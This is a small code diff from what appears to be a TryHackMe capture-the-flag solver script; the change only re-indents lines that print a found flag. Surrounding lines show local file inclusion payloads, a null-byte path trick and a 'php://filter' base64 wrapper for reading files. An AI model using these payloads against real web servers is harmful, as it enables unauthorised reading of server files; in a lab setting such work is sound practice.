@@ -40,10 +40,10 @@ for path in flag_paths:
 try:
         r = requests.get(test_url, timeout=5)
         if "THM{" in r.text:
-        print(f"{GREEN}[+] FLAG FOUND with Null Byte!{END}")
-        print(f"{GREEN}[+] URL: {test_url}{END}")
-        print(f"{GREEN}[+] FLAG: {r.text.strip()}{END}")
-        return True
+                print(f"{GREEN}[+] FLAG FOUND with Null Byte!{END}")
+                print(f"{GREEN}[+] URL: {test_url}{END}")
+                print(f"{GREEN}[+] FLAG: {r.text.strip()}{END}")
+                return True
 
         # Payload 2: PHP Filter - jo aaj kaam nahi kiya par idea sahi tha
         filter_payload = f"{prefix}/php://filter/convert.base64-encode/resource={path}"
